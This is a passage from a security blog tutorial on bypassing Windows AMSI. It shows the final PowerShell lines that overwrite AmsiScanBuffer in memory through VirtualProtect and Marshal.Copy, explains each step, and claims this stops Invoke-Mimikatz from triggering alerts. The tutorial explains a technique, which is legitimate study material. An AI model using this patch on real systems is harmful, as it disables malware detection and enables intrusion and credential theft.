<span class="err">$</span><span class="k">out</span> <span class="p">=</span> <span class="m">0</span>

<span class="p">[</span><span class="n">WinApi</span><span class="p">]::</span><span class="nf">VirtualProtect</span><span class="p">(</span><span class="err">$</span><span class="n">asbAddr</span><span class="p">,</span> <span class="p">[</span><span class="n">uint32</span><span class="p">]</span><span class="err">$</span><span class="n">ret</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="m">0x40</span><span class="p">,</span> <span class="p">[</span><span class="k">ref</span><span class="p">]</span> <span class="err">$</span><span class="k">out</span><span class="p">)</span>
<span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">.</span><span class="n">Marshal</span><span class="p">]::</span><span class="nf">Copy</span><span class="p">(</span><span class="err">$</span><span class="n">ret</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="err">$</span><span class="n">asbAddr</span><span class="p">,</span> <span class="err">$</span><span class="n">ret</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
<span class="p">[</span><span class="n">WinApi</span><span class="p">]::</span><span class="nf">VirtualProtect</span><span class="p">(</span><span class="err">$</span><span class="n">asbAddr</span><span class="p">,</span> <span class="p">[</span><span class="n">uint32</span><span class="p">]</span><span class="err">$</span><span class="n">ret</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="err">$</span><span class="k">out</span><span class="p">,</span> <span class="p">[</span><span class="k">ref</span><span class="p">]</span> <span class="err">$</span><span class="k">null</span><span class="p">)</span>
</pre></table></code></div></div><p>In the above code, first we are getting the handle to the amsi.dll library then calling GetProcAddress to get the address to the AmsiScanBuffer function inside amsi.dll. Then we are defining a variable named $ret which contains the bytes which will overwrite the very first instructions of AmsiScanBuffer, $out is what will contain the old permission of the memory region returned by VirtualProtect then we are calling VirtualProtect to change the permission of AmsiScanBuffer region to RWX(0x40) and then using Marshal.Copy to copy bytes from managed memory region to unmanaged and then calling VirtualProtect again to change back the permission of AmsiScanBuffer to previous one which we had stored in $out.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210816164830.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210816164938.png" alt="" /></p><p>As can be seen above, now passing “Invoke-Mimikatz” doesn’t trigger amsi alert. If you have attached the powershell session to WinDBG, you can verify if the AmsiScanBuffer was overwritten with our bytes.</p><p>Thank you very much for taking your time in reading this. Feel free to reach out to me @dazzyddos for any query or if there’s any correction or addition needed.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/dazzyddos/dazzyddos.github.io/master/Images/amsibypass/Pasted%20image%2020210816164903.png" alt="" /></p><h3 id="resources-and-references">Resources and References</h3><p>https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal</p><p>https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/</p><p>https://fluidattacks.com/blog/amsi-bypass/</p><p>https://frida.re</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/defense-evasion/'>Defense Evasion</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >pentesting</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/defender-bypass/" class="post-tag no-text-decoration" >defender bypass</a> <a href="/tags/av-bypass/" class="post-tag no-text-decoration" >av bypass</a> <a href="/tags/amsi-bypass/" class="post-tag no-text-decoration" >amsi bypass</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Defense Evasion Series Part 1 AMSI Bypass - Dazzy Ddos&url=https://dazzyddos.github.io/posts/AMSI-Bypass/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Defense Evasion Series Part 1 AMSI Bypass - Dazzy Ddos&u=https://dazzyddos.github.io/posts/AMSI-Bypass/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Defense Evasion Series Part 1 AMSI Bypass - Dazzy Ddos&url=https://dazzyddos.github.io/posts/AMSI-Bypass/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/(Un)Hooking,-COWs-and-Meow-Meow/">(Un)Hooking, COWs and Meow Meow</a><li><a href="/posts/Naughty_Hooking_Detoxifying_Memory/">Naughty Hooking Detoxifying Memory Before Doing Crime</a><li><a href="/posts/Remote-Process-Enumeration-with-WTS-Set-Of-APIs/">Remote Process Enumeration with WTS Set of Windows APIs</a><li><a href="/posts/AMSI-Bypass/">Defense Evasion Series Part 1 AMSI Bypass</a><li><a href="/posts/Automating-Phishing-Infrastructure-with-terraform-on-AWS/">Automating Phishing Infrastructure with terraform on AWS</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/frida/">frida</a> <a class="post-tag" href="/tags/hooking/">hooking</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/unhooking/">unhooking</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi bypass</a> <a class="post-tag" href="/tags/av-bypass/">av bypass</a> <a class="post-tag" href="/tags/aws/">aws</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/TryHackMe-Ra-Walkthrough/"><div class="card-body"> <span class="timeago small" > Feb 20, 2021 <i class="unloaded">2021-02-20T08:10:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe Ra Walkthrough</h3><div class="text-muted small"><p> Ra is an awesome box from TryHackMe by @4nqr34z and @theart42. Port Scanning and Basic Enumeration As always, will start with full port scan. Will do the other enumeration alongside till the nmap...</p></div></div></a></div><div class="card"> <a href="/posts/TryHackMe-Enterprise-Walkthrough/"><div class="card-body"> <span class="timeago small" > Mar 22, 2021 <i class="unloaded">2021-03-22T08:10:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe Enterprise Walkthrough</h3><div class="text-muted small"><p> Enterprise is an awesome box from TryHackMe by @NekoS3c You just landed in an internal network. You scan the network and there’s only the Domain Controller… Enumeration As always, we’ll st...</p></div></div></a></div><div class="card"> <a href="/posts/Docker-Build-Stage-Security-Best-Practices/"><div class="card-body"> <span class="timeago small" > Apr 4, 2021 <i class="unloaded">2021-04-04T09:10:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Docker Build Stage Security Best Practices</h3><div class="text-muted small"><p> Introduction Hi Dear Readers, hope you all are safe and doing good. So, I welcome you all to the blog post on Docker Build Stage Security Best Practices. The title might be confusing to many since ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Automating-Phishing-Infrastructure-with-terraform-on-AWS/" class="btn btn-outline-primary" prompt="Older"><p>Automating Phishing Infrastructure with terraform on AWS</p></a> <a href="/posts/Remote-Process-Enumeration-with-WTS-Set-Of-APIs/" class="btn btn-outline-primary" prompt="Newer"><p>Remote Process Enumeration with WTS Set of Windows APIs</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/dazzyddos">dazzy</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/frida/">frida</a> <a class="post-tag" href="/tags/hooking/">hooking</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/unhooking/">unhooking</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi bypass</a> <a class="post-tag" href="/tags/av-bypass/">av bypass</a> <a class="post-tag" href="/tags/aws/">aws</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://dazzyddos.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
